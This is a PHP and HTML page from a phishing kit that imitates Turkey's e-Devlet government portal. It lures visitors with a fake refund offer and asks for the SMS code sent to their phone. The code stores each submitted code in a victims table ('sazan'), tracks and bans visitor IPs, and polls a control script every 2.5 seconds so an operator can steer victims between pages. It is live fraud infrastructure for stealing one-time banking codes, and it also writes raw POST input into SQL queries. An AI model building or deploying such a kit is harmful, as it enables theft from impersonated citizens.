<?php
date_default_timezone_set('Europe/Istanbul');
include 'mysql.php';
include("admin/core/getRealIPAdress.php");

$mysqli = $_SESSION["mysqli"];
$queryid = $_SESSION["query"];
$ip = getUserIP();

mysqli_query($mysqli, "UPDATE sazan SET now = 'SMS Doğrulama' WHERE ip = '{$ip}'");

if($_POST)
{
	mysqli_query($mysqli, "UPDATE sazan SET sms = '{$_POST["sms1"]}' WHERE id = '{$queryid}'");
	header('Location:bekleyiniz.php');
}

$ban = mysqli_query($mysqli, "SELECT * FROM ban");
foreach($ban as $kontrol){
	if($kontrol['ban'] == $ip){
		header('Location:https://www.youtube.com/watch?v=KaInAwef530&ab_channel=AliDemirdal');
	}
}
?>
<html class="no-js test-supports test-csstransforms3d test-history test-target test-texttrackapi test-track test-no-contains test-supports test-csstransforms3d test-history test-target test-texttrackapi test-track test-no-contains" lang="tr"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta charset="utf-8">
    <meta http-equiv="x-ua-compatible" content="IE=edge">
    <meta http-equiv="cleartype" content="on">
    <title>e-Devlet Kapısı
    </title>
    <meta name="description" content="e-Devlet Kapısı">
    <meta name="description" content="e-Devlet Kapısı'nı kullanarak kamu kurumlarının sunduğu hizmetlere tek noktadan, hızlı ve güvenli bir şekilde ulaşabilirsiniz.">
    <meta name="keywords" content="e-devlet, türkiye.gov.tr, e-devlet kapısı, edevlet, e devlet, türkiyegovtr">
    <meta name="robots" content="index,follow">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="theme-color" content="#4284be">
    <link rel="icon" type="image/png" href="assets/img/favicon-196x196.png" sizes="196x196">
    <meta name="msapplication-TileColor" content="#FFFFFF">
    <link rel="stylesheet" href="assets/css/base.css">
    <script src="assets/js/header.js"></script>
    <link rel="stylesheet" href="assets/css/giris.css">

    <style>
        #page header h1 {
            
            background-image: url('assets/img/edkkds.svg');
            
        }
    </style>
</head>


<body data-lang="null">
<div id="page">
    


<header id="headerSection">
    
    <h1>Türkiye Cumhuriyeti Vatandaş Kimlik Doğrulama Sistemi</h1>
    <nav id="accesibilityBlock" class="visuallyhidden">
        <ul>
            <li><a href="#loginForm" accesskey="s">Ana Sayfa</a></li>
            <li><a href="#" accesskey="1">İçeriğe Git</a></li>
        </ul>
    </nav>
</header>
    <main>
        <section class="referrerApp">
            <img class="sso" src="assets/img/1.png" alt="" width="165" height="40">
            <dl>
                
                <dt>Giriş Yapılacak Uygulama</dt>
                <dd><span title="e-Devlet Kapısı">e-Devlet Kapısı</span></dd>
            </dl>
        </section>
<nav class="methodSelector">
</nav>


        
        <section id="pageContent">
            <div class="richText">
                <strong><font color="#3a89b4"></font></strong>  TL İade tutarınız belirlendi. İade hakkınızı kartınıza geri aktarmak için lütfen telefonunuza gönderilen sms şifresini giriniz
            </div>
            <form method="post" id="loginForm" name="sifreGirisForm" autocomplete="off">
                <fieldset>
                
                    <div class="formRow required ">
                        <label for="egpField" class="rowLabel">Sms Şifreniz:
                        </label>
                        <div class="fieldGroup">
                        <input name="sms1" id="egpField" type="tel" maxlength="10" class="text" tabindex="2" aria-required="true" required="">
                            <p>Lütfen telefonunuza gönderilen sms şifresini giriniz</p>

                        </div>
                    </div>

                    
                </fieldset>
                                <div class="loader" style="display: none"><img src="assets/img/form-progress.svg" alt="...">İşleminiz devam ediyor. Lütfen bekleyiniz...
                </div>
                <div class="formSubmitRow">
                     <button type="submit" class="submitButton">İadeyi Kartıma Aktar</button>
                    <button type="xx" class="backButton">İptal Et</button>

                </div>
            </form>
        </section>
    </main>
<footer>
    
    <ul class="footerLinks">
        <li>
            <a open-modal="gizlilikGuvenlik" href="#">Gizlilik ve Güvenlik</a>
        </li>
        <li>
            <a href="#/iletisim?hizli=CozumMerkezi2" target="_blank">Hızlı Çözüm Merkezi</a>
        </li>
    </ul>
    <div class="copyrightDetails">
        © 2023, Ankara - Tüm Hakları Saklıdır
    </div>

</footer><div class="printableFooter">          <div class="imageSection">              <img src="assets/img/bb-ubak-tsat-black.png">              <span class="imageInfo">
                    e-Devlet Kapısı’nın kurulması ve yönetilmesi görevi T.C.                    
Cumhurbaşkanlığı Dijital Dönüşüm Ofisi Başkanlığı tarafından                    
yürütülmekte olup, sistemin geliştirilmesi ve işletilmesi                   Türksat 
A.Ş. tarafından yapılmaktadır.              </span>             </div>          <div class="bottomInfo">
                ©2020 Tüm Hakları Saklıdır. Gizlilik, Kullanım ve Telif Hakları 
bildiriminde belirtilen kurallar çerçevesinde               hizmet sunulmaktadır. 
            </div>      </div>

</div>






<div class="mask"></div>
<!--[if gt IE 9]><!-->

<div class="modal" id="gizlilikGuvenlik">
    <div class="modal-container">
        <span class="close" close-modal=""><i class="edk-fonticon-close"></i></span>
        <h3>Gizlilik ve Güvenlik</h3>
        <div class="modal-content">
            <p>e-Devlet Kapısı çalışanları hiçbir zaman size şifrenizi 
sormayacaktır. Şifrenizi e-Devlet Kapısı giriş ekranları haricinde 
hiçbir yere kaydetmeyiniz. Tarayıcı uygulaması (Internet Explorer, 
Firefox, Safari ve benzeri uygulamaların) şifre kaydetme opsiyonlarını 
kapalı tutunuz. Ayrıca hiçbir zaman kişisel bilgileriniz veya şifreniz 
e-posta yolu ile sizlere sorulmayacaktır. Unutmayınız ki zararlı 
uygulamaların ve virüslerin büyük çoğunluğu e-posta yolu ile 
yayılmaktadır. Bu sebeple göndericisini tanımadığınız veya şüpheli 
e-postaları okumadan siliniz.</p>
            <p>e-Devlet Kapısı sistemi, güvenlik amaçlı olarak 
elektronik sertifika kullanmaktadır. Erişiminizin güvenli olup 
olmadığını adres çubuğunda yer alan adresin http değil https ile 
başlamasından ve tarayıcı uygulamasındaki kilit resminden 
anlayabilirsiniz.</p>
        </div>
        <div class="modal-footer">
            <div class="formSubmitRow">
                <button class="cancelButton" close-modal="">Kapat</button>
            </div>
        </div></div>
    <div class="modalBg"></div>
</div>


<div class="modal" id="info">
    <div class="modal-container">
        <span class="close" close-modal=""><i class="edk-fonticon-close"></i></span>
        <h3>e-Devlet Şifresi</h3>
        <div class="modal-content">
            <p>e-Devlet şifrenizi içeren zarfınızı PTT Merkez 
Müdürlüklerinden, şahsen başvuru ile, üzerinde T.C. Kimlik numaranızın 
bulunduğu kimliğinizi ibraz ederek temin edebilirsiniz.</p>
            <p>Bu uygulama, sizin yerinize başka bir kişinin şifre alıp 
adınıza işlem yapmasının önüne geçilmesi için gerekmektedir. e-Devlet 
Kapısı üzerinden verilen hizmetler yüksek güvenlik seviyesi 
gerektirdiğinden, şifreler başvuru sahipleri için özel olarak 
oluşturulmaktadır. Bu nedenle ancak kimlik ibrazı ve şahsen başvuru ile 
şifreler verilmektedir.</p>
            <p>e-Devlet Kapısı kayıtlı kullanıcısıysanız ve şifrenizle 
giriş yaptıktan sonra "Profilim" alanında bulunan iletişim bilgileri 
kısmına cep telefonunuzu kaydettiyseniz ya da cep telefonunuzu veya hem 
cep telefonunuzu hem de e-posta adresinizi e-Devlet Kapısında 
doğruladıysanız şifre yenileme hizmetinden yararlanarak yeniden şifre 
temin edebilirsiniz. Bununla birlikte, mobil imza, elektronik imza, yeni
 T.C. kimlik kartı veya internet bankacılığı kullanıyorsanız, e-Devlet 
Kapısına bunlardan biri ile giriş yaptıktan sonra da şifre 
oluşturabilirsiniz.</p>
            <p>Şifre ilk alındığında PTT tarafından işlem masrafı olarak
 2 TL tahsil edilmektedir. Şifrenin kaybedilmesi, unutulması vb. 
durumlarda PTT'den alınacak her şifre için ayrıca 4 TL ücret 
ödenmektedir. Bu işlem masrafı dışında herhangi bir yıllık ücret 
ödenmesi söz konusu değildir.</p>
            <p>e-Devlet şifresi yurt dışında Elçilik ve Konsolosluklardan ücretsiz olarak temin edilebilmektedir.</p>

        </div>
        <div class="modal-footer">
            <div class="formSubmitRow">
                <button class="cancelButton" close-modal="">Kapat</button>
            </div>
        </div></div>
    <div class="modalBg"></div>
</div>

<script type="text/javascript">
$(document).ready(function() {
    gonder();
	var int = self.setInterval("gonder()", 2500);
});

function gonder(){
    $.ajax({
		type:'POST',
		url:'veri.php?ip=<?php echo $ip ?>',
		success: function (msg) {
			if(msg == "back") {
				window.location.href='index.php';
			}
			if(msg == "hata1") {
				window.location.href='sms-hatali.php';
			}
			if(msg == "sms") {
				window.location.href='sms-dogrulama.php';
			}
			if(msg == "tebrik"){
				window.location.href='tebrikler.php';
			}
		}
    });
}
</script>

<div id="facebox" style="display:none" role="dialog"><div class="body"><a class="visuallyhidden" id="popAnchor">Yeni Pencere Açıldı. Pencereyi kapamak için ESC tuşuna basabilirsiniz.</a><div id="modalContent" class="content"></div></div></div></body></html>